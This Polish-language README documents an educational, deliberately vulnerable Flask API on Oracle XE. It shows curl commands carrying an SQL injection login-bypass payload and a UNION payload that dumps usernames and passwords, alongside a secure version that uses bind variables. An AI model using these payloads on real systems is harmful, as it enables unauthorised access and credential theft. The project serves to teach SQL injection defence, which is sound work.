# Oracle SQL Injection [education purpose only] – Vulnerable Flask API

Projekt prezentujący dwa prawdziwe ataki SQL Injection na bazie **Oracle XE 21c**:

- **Authentication Bypass** (login bez hasła)
- **UNION-based SQLi (data exfiltration)** – pełny dump tabeli `users`

oraz poprawne zabezpieczenie z wykorzystaniem **bind variables**.

---

## 🛠️ Technologie
- Python 3.x  
- Flask  
- Oracle Database XE 21c  
- oracledb (driver)  
- curl (do testowania API)

---

## 📂 Struktura projektu

```
├── app.py # Flask API (vulnerable + secure endpoints)
├── db.py # połączenie z Oracle
├── vulnerable_queries.py # celowo podatne zapytania (SQL Injection)
├── secure_queries.py # bezpieczne zapytania (bind variables)
└── README.md
```

## 0. Utworzenie usera (Oracle XE)

👉
![users_creation](https://github.com/norb1x/oracle-vuln-api/blob/main/screenshots/oracle_usercreation.png)

### Tabela `users` i dane testowe

![users_table_setup](https://github.com/norb1x/oracle-vuln-api/blob/main/screenshots/oracle_secuserX.png)

## 1. Authentication Bypass (SQL Injection)

POST /login_vuln
curl -X POST http://127.0.0.1:5000/login_vuln \
  -H "Content-Type: application/json" \
  -d "{\"username\": \"admin' OR '1'='1' -- \", \"password\": \"x\"}"
  ![auth_bypass](https://github.com/norb1x/oracle-vuln-api/blob/main/screenshots/auth_bypass.png)

  EXAMPLE - INVALID PAYLOAD
![invalid payload](https://github.com/norb1x/oracle-vuln-api/blob/main/screenshots/sql_invalid_payload.png)

## 2. Secure Login (bez SQL Injection)

PAYLOAD = admin' OR '1'='1' --
{ "message": "Invalid credentials" }

![secure_block_sqli](https://github.com/norb1x/oracle-vuln-api/blob/main/screenshots/secure_block_sqli.png)

## 3. UNION-based SQL Injection (data exfiltration)

curl -X POST http://127.0.0.1:5000/dump_vuln \
  -H "Content-Type: application/json" \
  -d "{\"search\":\"admin\"}"
![dump_normal](https://github.com/norb1x/oracle-vuln-api/blob/main/screenshots/dump_normal.png)

SQL Injection payload:
curl -X POST http://127.0.0.1:5000/dump_vuln \
  -H "Content-Type: application/json" \
  -d "{\"search\":\"' UNION SELECT username, password, role FROM users -- \"}"
![dump_union_sqli.png](https://github.com/norb1x/oracle-vuln-api/blob/main/screenshots/dump_union_sqli.png)
